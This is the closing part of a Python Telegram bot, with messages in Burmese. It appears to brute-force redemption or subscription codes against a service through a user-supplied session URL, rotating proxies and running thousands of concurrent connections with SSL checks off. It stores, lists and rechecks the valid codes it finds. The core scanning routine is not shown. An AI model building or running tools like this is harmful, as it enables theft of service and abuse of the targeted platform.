        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။",
                                     chat_id=chat_id,
                                     message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params['length'],
                                params['target'], call.message,
                                plan_filters=params.get('plan_filters', []))
    else:
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id)
            last_scan_params.pop(chat_id, None)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။",
                                         chat_id=chat_id,
                                         message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params['length'],
                                    params['target'], call.message,
                                    plan_filters=params.get('plan_filters', []))
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။",
                                         chat_id=chat_id,
                                         message_id=call.message.message_id)

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return

    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        for item in success:
            c = item["code"]
            plan = item.get("plan", "N/A")
            parts.append(f"`{c}` – ⏳ {plan}")
    if limited:
        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(limited)

    full_text = "\n".join(parts)
    MAX = 4096
    if len(full_text) > MAX:
        for i in range(0, len(full_text), MAX):
            await bot.send_message(chat_id, full_text[i:i+MAX], parse_mode="Markdown")
    else:
        await bot.reply_to(message, full_text, parse_mode="Markdown")

@bot.message_handler(commands=['delete_saved'])
async def delete_saved(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ဖျက်ရန် code မရှိပါ။")
        return

    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

    try:
        results, sha = await get_file_content("result.json")
        if str(chat_id) in results:
            del results[str(chat_id)]
            await update_file_content("result.json", results, sha, f"Delete codes for {chat_id}")
    except Exception as e:
        print(f"[delete_saved] GitHub error: {e}")

    await bot.reply_to(message, "🗑️ Saved codes အားလုံး ဖျက်ပြီးပါပြီ။")

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
    current = notify_setting.get(chat_id, DEFAULT_NOTIFY)
    notify_setting[chat_id] = not current
    state = "ON ✅" if notify_setting[chat_id] else "OFF ❌"
    await bot.reply_to(message, f"Notify: {state}")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
        return
    await bot.reply_to(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")
    new_success = []
    for item in success:
        code = item["code"]
        recode = await perform_check(
            user_data[chat_id]['session_url'], code, chat_id,
            recheck=True, message=message
        )
        if recode:
            new_success.append(item)
    if new_success:
        success_texts[chat_id] = new_success
        codes_str = "\n".join([f"`{i['code']}` – ⏳ {i.get('plan','N/A')}" for i in new_success])
        await bot.reply_to(message, f"✅ Rechecked Codes ({len(new_success)}):\n{codes_str}",
                           parse_mode="Markdown")
    else:
        success_texts[chat_id] = []
        await bot.reply_to(message, "Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")

@bot.message_handler(commands=['status'])
async def status(message):
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    pool_size = _session_pool.qsize() if _session_pool else 0
    ps = proxy_rotator.stats()
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"👥 Sessions Loaded: {len(user_data)}\n"
        f"⚙️ Concurrency: {CONCURRENCY}\n"
        f"🔋 Pool Available: {pool_size}/{POOL_SIZE}\n\n"
        f"🌐 Proxy: {'✅' if ps['enabled'] else '❌'} | Alive: {ps['alive']} | Refresh: {ps['last_refresh']}s ago"
    )

# ── Polling and main ──────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(
        limit=3000,
        limit_per_host=1500,
        ttl_dns_cache=600,
        ssl=False,
        keepalive_timeout=60,
        force_close=False,
        enable_cleanup_closed=True
    )
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    try:
        await init_session_pool()
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        if ENABLE_PROXY:
            asyncio.create_task(proxy_refresh_loop())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
